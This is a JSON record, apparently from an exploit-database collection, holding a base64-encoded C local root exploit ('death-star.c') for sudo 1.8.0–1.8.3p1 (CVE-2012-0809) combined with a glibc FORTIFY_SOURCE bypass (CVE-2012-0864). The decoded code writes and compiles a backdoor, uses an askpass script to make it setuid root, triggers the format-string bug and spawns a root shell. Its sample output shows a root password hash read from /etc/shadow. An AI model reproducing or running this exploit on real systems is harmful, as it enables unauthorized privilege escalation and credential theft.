{
    "source": "exploit-database", 
    "exploit": "LyoNCiBkZWF0aC1zdGFyLmMNCiBzdWRvIHYxLjguMC0xLjguM3AxIChzdWRvX2RlYnVnKSBmb3JtYXQgc3RyaW5nIHJvb3QgZXhwbG9pdCArIGdsaWJjIEZPUlRJRllfU09VUkNFIGJ5cGFzcw0KIGJ5IGFlb24gLSBodHRwOi8vaW5mb3NlY2Fic3VyZGl0eS53b3JkcHJlc3MuY29tLw0KDQogVGhpcyBQb0MgZXhwbG9pdHM6DQogLSBDVkUtMjAxMi0wODY0IC0gRk9SVElGWV9TT1VSQ0UgZm9ybWF0IHN0cmluZyBwcm90ZWN0aW9uIGJ5cGFzcyB2aWEgIm5hcmdzIiBpbnRlZ2VyIG92ZXJmbG93DQogLSBDVkUtMjAxMi0wODA5IC0gc3VkbyB2MS44LjAtMS44LjNwMSAic3Vkb19kZWJ1ZyIgZm9ybWF0IHN0cmluZw0KIA0KIFRlc3RlZCBvbjoNCiAtIEZlZG9yYSBjb3JlIDE2IHZlcm5lDQogLSBnbGliYyAyLjE0LjkwLjE0IHJlbGVhc2UNCiAtIHN1ZG8gMS44LjFwMg0KIA0KIE5vdGVzOg0KIC0gVGhpcyBleHBsb2l0IGFjdHVhbGx5IHR1cm5lZCBvdXQgdmVyeSByZWxpYWJsZSA6LSkgDQogLSBZb3UgY2FuIG1ha2UgYSBjbGVhbmVyIHZlcnNpb24gb2YgdGhpcyBleHBsb2l0IGlmIHlvdSBzbWFzaCBzdWRvX2RlYnVnIGZ1bmN0aW9uIHBvaW50ZXINCiAgIG9yIGEgbGliYyBmdW5jdGlvbiBwb2ludGVyIHNvIHlvdSBkb250IHdyaXRlIHRvIGRpc2suIEkgd29udCBiZSByZWxlYXNpbmcgdGhhdCB2ZXJzaW9uIDotKQ0KDQogUmVmZXJlbmNlcyBhbmQgdGhhbmtzIHRvbzoNCiAtIGh0dHA6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxMi9KYW4vYXR0LTU5MC9hZHZpc29yeV9zdWRvLnR4dA0KIC0gaHR0cDovL3d3dy52bnNlY3VyaXR5Lm5ldC8yMDEyLzAyL2V4cGxvaXRpbmctc3Vkby1mb3JtYXQtc3RyaW5nLXZ1bmVyYWJpbGl0eS8NCiAtIGh0dHA6Ly93d3cuYWxlcnRsb2dpYy5jb20vbW9kZXJuLXVzZXJsYW5kLWxpbnV4LWV4cGxvaXRhdGlvbi1jb3Vyc2V3YXJlLw0KIC0gIkEgRXVsb2d5IGZvciBGb3JtYXQgU3RyaW5ncyIgaHR0cDovL3d3dy5waHJhY2sub3JnL2lzc3Vlcy5odG1sP2lzc3VlPTY3JmlkPTkmbW9kZT10eHQNCg0KW2Flb25AbG9jYWxob3N0IHRtcF0kIGdjYyBkZWF0aC1zdGFyLmMgLW8gZGVhdGgtc3Rhcg0KW2Flb25AbG9jYWxob3N0IHRtcF0kIC4vZGVhdGgtc3RhciANClsrXSBUYXJnZXRpbmcgcmVsZWFzZTogMy4xLjAtNy5mYzE2Lmk2ODYuUEFFDQpbK10gRm91bmQgdnVsbiBnbGliYyB2ZXJzaW9uOiAyLjE0LjkwDQpbK10gRm91bmQgYSB2dWxuIHN1ZG8gdmVyc2lvbjogMS44LjENClsrXSBXcml0aW5nIGJhY2tkb29yOiBlLmMNClsrXSBDb21waWxpbmcgYmFja2Rvb3I6IGUNClsrXSBXcml0aW5nIFNVRE9fQVNLUEFTUyBmaWxlOiBlLnNoDQpbK10gUHJlc3MgZW50ZXIgd2hlbiByZWFkeS4uLg0KDQo8IC0tLS0tLS0tLS0tLS0tIFJFTU9WRUQgLS0tLS0tLS0tLS0tLS0+DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgIEHvv70bQUYBQB9GAUAfRgFAH0YBQB9GAUAfAicgZnJvbSBMRF9QUkVMT0FEIGNhbm5vdCBiZSBwcmVsb2FkZWQ6IGlnbm9yZWQuDQogJTEwNzM4MjUzMTElMjEzNzI3MzYgJTogc2V0dGluZ3M6IA0KPQ0KICUxMDczODI1MzExJTIxMzcyNzM2ICU6IHNldHRpbmdzOiANCj0NCiAlMTA3MzgyNTMxMSUyMTM3MjczNiAlOiBzdWRvX21vZGUgMTA4MTM4MzE2OQ0KU29ycnksIHRyeSBhZ2Fpbi4NClNvcnJ5LCB0cnkgYWdhaW4uDQpTb3JyeSwgdHJ5IGFnYWluLg0KJTIwJDA4biAlKjQ4MiQgJSoyODUwJCAlMTA3Mzc0MTgyNCQ6IDMgaW5jb3JyZWN0IHBhc3N3b3JkIGF0dGVtcHRzDQogJTEwNzM4ODYyNTElMjEzNzI3MzYgJTogcG9saWN5IHBsdWdpbiByZXR1cm5zIDEwODE0MDI0NDUNClsrXSBHZXR0aW5nIHJvb3QuLiENClsrXSBDbGVhbmluZyBzeXN0ZW0uDQpbK10gTGF1bmNoaW5nIHJvb3Qgc2hlbGwhDQpzaC00LjIjIGlkOyB1bmFtZSAtYQ0KdWlkPTAocm9vdCkgZ2lkPTEwMDEoYWVvbikgZ3JvdXBzPTAocm9vdCksMTAwMShhZW9uKSBjb250ZXh0PXVuY29uZmluZWRfdTp1bmNvbmZpbmVkX3I6dW5jb25maW5lZF90OnMwLXMwOmMwLmMxMDIzDQpMaW51eCBsb2NhbGhvc3QubG9jYWxkb21haW4gMy4xLjAtNy5mYzE2Lmk2ODYuUEFFICMxIFNNUCBUdWUgTm92IDEgMjA6NTM6NDUgVVRDIDIwMTEgaTY4NiBpNjg2IGkzODYgR05VL0xpbnV4DQpzaC00LjIjIGhlYWQgLW4xIC9ldGMvc2hhZG93DQpyb290OiQ2JFl4REIuU052dG5xaHR0LlQkc2xJT0pTbDdMejA3UHRERjIzbTFHMGV2Wkg0TVh2cG8xVk5lYlVVYXNNL2plMnNQNkZYaTJZL1FFMU50Zy45M2pPdFRRT2ZaOGsyZS9IaFQ4WHpYTi86MTU4MTg6MDo5OTk5OTo3Ojo6DQpzaC00LjIjDQoqLw0KDQojaW5jbHVkZSA8c3lzL3Jlc291cmNlLmg+DQojaW5jbHVkZSA8c3lzL3V0c25hbWUuaD4NCiNpbmNsdWRlIDxnbnUvbGliYy12ZXJzaW9uLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzeXMvdGltZS5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCg0KI2RlZmluZSBPRkZTRVQgICAgICAgNjUwMDANCiNkZWZpbmUgTlVNX1RIUkVBRFMgIDANCg0KLyogZmlsZXMgdGhhdCB3ZSBjcmVhdGUgb24gZGlzayAqLw0KI2RlZmluZSBCQUNLRE9PUiAgICAgImUuYyINCiNkZWZpbmUgQkRfQ09NUElMRUQgICJlIg0KI2RlZmluZSBTVURPX0FTS1BBU1MgImUuc2giDQoNCmV4dGVybiBjaGFyICoqZW52aXJvbjsNCnN0cnVjdCB1dHNuYW1lIHZlcjsNCg0Kdm9pZCAqa2lsbF9zdWRvKCk7DQp2b2lkICpwb3Bfc2hlbGwoKTsNCnZvaWQgKnNldF9lbnYoKTsNCmludCBpc19nbGliY192dWxuKCk7DQppbnQgaXNfc3Vkb192dWxuKCk7DQppbnQgd3JpdGVfYmFja2Rvb3IoKTsNCg0KLyogaGFyZGNvZGVkIHBhdGggdG8gc3VkbyAqLw0KY29uc3QgY2hhciBzdWRvW10gPSAiL3Vzci9iaW4vc3Vkb1wwIjsNCmNoYXIgc192ZXJzaW9uWzIwXTsNCg0KLyogdnVsbiB2ZXJzaW9ucyBvZiBzdWRvICovDQpjaGFyIHZ1bG5fc3Vkb192ZXJzaW9uc1s0XVsyMF0gPSB7DQogICAgeyIxLjguMCJ9LA0KICAgIHsiMS44LjEifSwNCiAgICB7IjEuOC4yIn0sDQogICAgeyIxLjguMyJ9DQp9Ow0KDQovKiB2dWxuIHZlcnNpb25zIG9mIGdsaWJjICovDQpjaGFyIHZ1bG5fZ2xpYmNfdmVyc2lvbnNbNF1bMjBdID0gew0KICAgIHsiMi4xNC45MCJ9LA0KfTsNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkNCnsNCiAgICBzdHJ1Y3QgcmxpbWl0IHJhcmE7DQogICAgaW50IHN0YXR1czsNCiAgICBjaGFyIHJlYWR5Ow0KICAgIHVuYW1lKCZ2ZXIpOw0KICAgIHByaW50ZigiWytdIFRhcmdldGluZyByZWxlYXNlOiAlc1xuIiwgdmVyLnJlbGVhc2UpOw0KICAgIGlmIChpc19nbGliY192dWxuKCkpew0KICAgICAgICBpZihpc19zdWRvX3Z1bG4oKSl7DQogICAgICAgICAgICBpZiAod3JpdGVfYmFja2Rvb3IoKSl7DQogICAgICAgICAgICAgICAgcHJpbnRmKCJbK10gUHJlc3MgZW50ZXIgd2hlbiByZWFkeS4uLiIpOw0KICAgICAgICAgICAgICAgIHNjYW5mKCIlYyIsICZyZWFkeSk7DQogICAgICAgICAgICB9ZWxzZXsgZXhpdCgwKTsgfQ0KICAgICAgICB9ZWxzZXsgZXhpdCgwKTsgfQ0KICAgIH1lbHNleyBleGl0KDApOyB9DQoNCiAgICAvLyB1bGltaXRlZCBzdGFjaw0KICAgIHJhcmEucmxpbV9tYXggPSByYXJhLnJsaW1fY3VyID0gLTE7DQogICAgc2V0cmxpbWl0KFJMSU1JVF9TVEFDSywgJnJhcmEpOw0KDQogICAgcGlkX3QgcGlkOw0KICAgIGlmKChwaWQgPSBmb3JrKCkpIDwgMCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEFuIGVycm9yIG9jY3VycmVkIHdoaWxlIGZvcmtpbmcgc3Vkb1xuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgZWxzZSBpZihwaWQgPT0gMCl7DQogICAgICAgIHNldF9lbnYoKTsNCiAgICAgICAga2lsbF9zdWRvKCk7DQogICAgfWVsc2V7DQogICAgICAgIHdhaXQoJnN0YXR1cyk7DQogICAgICAgIGlmIChXSUZFWElURUQoc3RhdHVzKSkgew0KICAgICAgICAgICAgc2xlZXAoMSk7DQogICAgICAgICAgICBwb3Bfc2hlbGwoKTsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KaW50IGlzX2dsaWJjX3Z1bG4oKXsNCiAgICBpbnQgaSwgcmV0dXJudmFsID0gLTE7DQogICAgZm9yIChpID0gMDsgaSA8IDQ7IGkrKyl7DQogICAgICAgIGlmIChzdHJjbXAoZ251X2dldF9saWJjX3ZlcnNpb24oKSwgdnVsbl9nbGliY192ZXJzaW9uc1tpXSkgPT0gMCl7DQogICAgICAgICAgICBwcmludGYoIlsrXSBGb3VuZCB2dWxuIGdsaWJjIHZlcnNpb246ICVzXG4iLCBnbnVfZ2V0X2xpYmNfdmVyc2lvbigpKTsNCiAgICAgICAgICAgIHJldHVybnZhbCA9IDE7DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuIHJldHVybnZhbDsNCn07DQoNCmludCBpc19zdWRvX3Z1bG4oKXsNCiAgICBpbnQgaSwgcmV0dXJudmFsID0gLTE7Ow0KICAgIEZJTEUgKmZwOw0KICAgIGNoYXIgcGF0aFsyMF07DQogICAgY2hhciBzdWRvX3Zlcl9jbWRbNTBdOw0KICAgIHNucHJpbnRmKHN1ZG9fdmVyX2NtZCwgc2l6ZW9mKHN1ZG8pKzMsIiVzIC1WIiwgc3Vkbyk7DQogICAgZnAgPSBwb3BlbihzdWRvX3Zlcl9jbWQsICJyIik7DQoNCiAgICBpZiAoZnAgPT0gTlVMTCkgew0KICAgICAgICBwcmludGYoIlstXSBGYWlsZWQgdG8gZ2V0IHN1ZG8ncyB2ZXJzaW9uXG5bLV1FeGl0aW5nLi4iICk7DQogICAgICAgIGV4aXQoMCk7DQogICAgfQ0KICAgIGZnZXRzKHBhdGgsIDIxLCBmcCk7DQogICAgbWVtbW92ZSAoc192ZXJzaW9uLCBwYXRoKzEzLDUpOw0KICAgIGZvciAoaSA9IDA7IGkgPCA0OyBpKyspew0KICAgICAgICBpZiAoc3RyY21wKHNfdmVyc2lvbiwgdnVsbl9zdWRvX3ZlcnNpb25zW2ldKSA9PSAwKXsNCiAgICAgICAgICAgIHByaW50ZigiWytdIEZvdW5kIGEgdnVsbiBzdWRvIHZlcnNpb246ICVzXG4iLCBzX3ZlcnNpb24pOw0KICAgICAgICAgICAgcmV0dXJudmFsID0gMTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gcmV0dXJudmFsOw0KfTsNCg0KaW50IHdyaXRlX2JhY2tkb29yKCl7DQogICAgaW50IHJldHVybnZhbCA9IDE7DQogICAgY2hhciBhc2twYXNzWzEwMF0sIGNvbXBpbGVfYmRbMTAwXTsNCiAgICBjaGFyIGJkY29kZVtdID0gIiNpbmNsdWRlIDxzdGRpby5oPlxyXG4iDQogICAgICAgICAgICAgICAgICAgICIjaW5jbHVkZSA8c3RkbGliLmg+XHJcbiINCiAgICAgICAgICAgICAgICAgICAgImludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndil7XHJcbiINCiAgICAgICAgICAgICAgICAgICAgIiAgICBwcmludGYoXCJbK10gR2V0dGluZyByb290Li4hXFxuXCIpO1xyXG4iDQogICAgICAgICAgICAgICAgICAgICIgICAgc2V0cmVzdWlkKDAsMCwwKTtcclxuIg0KICAgICAgICAgICAgICAgICAgICAiICAgIHByaW50ZihcIlsrXSBDbGVhbmluZyBzeXN0ZW0uXFxuXCIpO1xyXG4iDQogICAgICAgICAgICAgICAgICAgICIgICAgcmVtb3ZlKFwiZVwiKTsgcmVtb3ZlKFwiZS5jXCIpOyByZW1vdmUoXCJlLnNoXCIpO1xyXG4iDQogICAgICAgICAgICAgICAgICAgICIgICAgcHJpbnRmKFwiWytdIExhdW5jaGluZyByb290IHNoZWxsIVxcblwiKTtcclxuIg0KICAgICAgICAgICAgICAgICAgICAiICAgIHN5c3RlbShcIi9iaW4vc2hcIik7XHJcbiINCiAgICAgICAgICAgICAgICAgICAgIiAgICBleGl0KDApO1xyXG4iDQogICAgICAgICAgICAgICAgICAgICJ9XHJcbiI7DQoNCiAgICBGSUxFICpmcCA9IGZvcGVuKEJBQ0tET09SLCJ3YiIpOw0KICAgIGlmIChmcCA9PSBOVUxMKSB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byB3cml0ZSBiYWNrZG9vciBvbiB0aGUgdGFyZ2V0LCBjaGVjayB5b3VyIHBlcm1pc3Npb25zXG4iICk7DQogICAgICAgIHJldHVybnZhbCA9IC0xOw0KICAgIH1lbHNlew0KICAgICAgICBwcmludGYoIlsrXSBXcml0aW5nIGJhY2tkb29yOiAlc1xuIiwgQkFDS0RPT1IpOw0KICAgIH0NCg0KICAgIGZ3cml0ZShiZGNvZGUsIDEsIHNpemVvZihiZGNvZGUpLTEsIGZwKTsgZmNsb3NlKGZwKTsNCiAgICBtZW1zZXQoY29tcGlsZV9iZCwgMHgwMCwgc2l6ZW9mKGNvbXBpbGVfYmQpKTsNCiAgICBzbnByaW50Zihjb21waWxlX2JkLCBzaXplb2YoQkFDS0RPT1IpK3NpemVvZihCRF9DT01QSUxFRCkrMTcsIi91c3IvYmluL2djYyAlcyAtbyAlcyIsIEJBQ0tET09SLCBCRF9DT01QSUxFRCk7DQogICAgcHJpbnRmKCJbK10gQ29tcGlsaW5nIGJhY2tkb29yOiAlc1xuIiwgQkRfQ09NUElMRUQpOw0KICAgIGZwID0gcG9wZW4oY29tcGlsZV9iZCwgInIiKTsNCg0KICAgIGlmIChmcCA9PSBOVUxMKSB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBjb21waWxlIHRoZSBiYWNrZG9vciwgY2hlY2sgdGhlIGdjYyBwYXRoXG4iICk7DQogICAgICAgIHJldHVybnZhbCA9IC0xOw0KICAgIH0NCg0KICAgIGZjbG9zZShmcCk7DQogICAgbWVtc2V0KGFza3Bhc3MsIDB4MDAsIHNpemVvZihhc2twYXNzKSk7DQogICAgc25wcmludGYoYXNrcGFzcywgc2l6ZW9mKEJEX0NPTVBJTEVEKSoyKzM5LCIjIS9iaW4vc2hcbmNob3duIHJvb3Q6cm9vdCAlc1xuY2htb2QgNDc3NyAlc1xuIiwgQkRfQ09NUElMRUQsIEJEX0NPTVBJTEVEKTsNCiAgICBmcCA9IGZvcGVuKFNVRE9fQVNLUEFTUywidyIpOw0KDQogICAgaWYgKGZwID09IE5VTEwpIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRmFpbGVkIHRvIHdyaXRlIGJhY2tkb29yIG9uIHRoZSB0YXJnZXQsIGNoZWNrIHlvdXIgcGVybWlzc2lvbnNcbiIgKTsNCiAgICAgICAgcmV0dXJudmFsID0gLTE7DQogICAgfWVsc2V7DQogICAgICAgIHByaW50ZigiWytdIFdyaXRpbmcgU1VET19BU0tQQVNTIGZpbGU6ICVzXG4iLCBTVURPX0FTS1BBU1MpOw0KICAgIH0NCg0KICAgIGZ3cml0ZShhc2twYXNzLCAxLCBzaXplb2YoYXNrcGFzcyktMSwgZnApOyBmY2xvc2UoZnApOw0KICAgIGNobW9kKFNVRE9fQVNLUEFTUywgMDc1NSk7DQogICAgcmV0dXJuIHJldHVybnZhbDsNCn07DQoNCnZvaWQgKnNldF9lbnYoKXsNCiAgICBpbnQgaSA9IDA7DQogICAgY2hhciBsZF9wcmVsb2FkX2V2YXJbT0ZGU0VUXSA9ICJMRF9QUkVMT0FEPSI7DQogICAgY2hhciB1c2VyX2RldGFpbHNbT0ZGU0VUXSA9IHsweDFmLCAweDQ2LCAweDAxLCAweDQwfTsNCiAgICBjaGFyIHN1ZG9fYXNrcGFzc19ldmFyWzQwXTsNCiAgICBmb3IgKGk9MDsgaTwoT0ZGU0VULzQpOyBpKyspew0KICAgICAgICBtZW1jcHkodXNlcl9kZXRhaWxzKyhpKjQpLCB1c2VyX2RldGFpbHMsIHNpemVvZihpbnQpKTsNCiAgICB9DQoNCiAgICBtZW1tb3ZlIChsZF9wcmVsb2FkX2V2YXIrMTEsIHVzZXJfZGV0YWlscyAsIHNpemVvZih1c2VyX2RldGFpbHMpKTsNCiAgICBtZW1zZXQoc3Vkb19hc2twYXNzX2V2YXIsIDB4MDAsIHNpemVvZihzdWRvX2Fza3Bhc3NfZXZhcikpOw0KICAgIHNucHJpbnRmKHN1ZG9fYXNrcGFzc19ldmFyLCBzaXplb2YoU1VET19BU0tQQVNTKSsxMywiU1VET19BU0tQQVNTPSVzIiwgU1VET19BU0tQQVNTKTsNCg0KICAgIC8vIHNldCBvdXIgZW52aXJvbm1lbnQNCiAgICBwdXRlbnYobGRfcHJlbG9hZF9ldmFyKTsNCiAgICBwdXRlbnYoc3Vkb19hc2twYXNzX2V2YXIpOw0KfTsNCg0Kdm9pZCAqa2lsbF9zdWRvKCl7DQogICAgY2hhciBmbXRzdHJpbmdbXSA9ICIlMjAkMDhuICUqNDgyJCAlKjI4NTAkICUxMDczNzQxODI0JCI7DQogICAgY2hhciAqYXJnc1tdID0geyBmbXRzdHJpbmcsICItRDkiLCAiLUEiLCAiIiwgTlVMTH07DQoNCiAgICAvLyB0cmlnZ2VyIHRoZSB2dWxuDQogICAgZXhlY3ZlKHN1ZG8sIGFyZ3MsIGVudmlyb24pOw0KfTsNCg0Kdm9pZCAqcG9wX3NoZWxsKCl7DQogICAgLy8gc2V0IG91ciBlbnZpcm9ubWVudA0KICAgIHVuc2V0ZW52KCJMRF9QUkVMT0FEIik7DQogICAgdW5zZXRlbnYoIlNVRE9fQVNLUEFTUyIpOw0KICAgIGNoYXIgKmV4cGxvaXRfYXJnc1tdID0geyBCRF9DT01QSUxFRCwgTlVMTCB9Ow0KICAgIGV4ZWN2ZShCRF9DT01QSUxFRCwgZXhwbG9pdF9hcmdzLCBlbnZpcm9uKTsNCn07", 
    "filename": "platforms/linux/local/25134.c", 
    "id": "25134", 
    "cves": [
        "CVE-2012-0864", 
        "CVE-2012-0809"
    ]
}